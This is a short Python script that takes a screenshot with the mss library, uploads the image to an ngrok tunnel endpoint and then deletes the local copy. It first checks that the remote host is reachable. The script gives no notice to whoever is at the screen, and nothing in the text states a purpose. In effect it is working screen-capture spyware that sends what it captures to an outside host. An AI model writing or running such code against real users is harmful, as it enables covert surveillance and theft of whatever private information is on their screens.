from mss import mss
import requests
import os


def take_screenshot():
    with mss() as sct:
        try:
            response = requests.get('https://closing-blatantly-wahoo.ngrok-free.app/')
            if response.status_code != 200:
                raise Exception('Failed to retrieve website')
        except Exception as e:
            print(f'Failed to retrieve website: {str(e)}')
            return

        filename = sct.shot(output = "screenshot.png")
        with open(filename, "rb") as img:
            requests.post('https://closing-blatantly-wahoo.ngrok-free.app/upload', files={'image': img})
        os.remove(filename)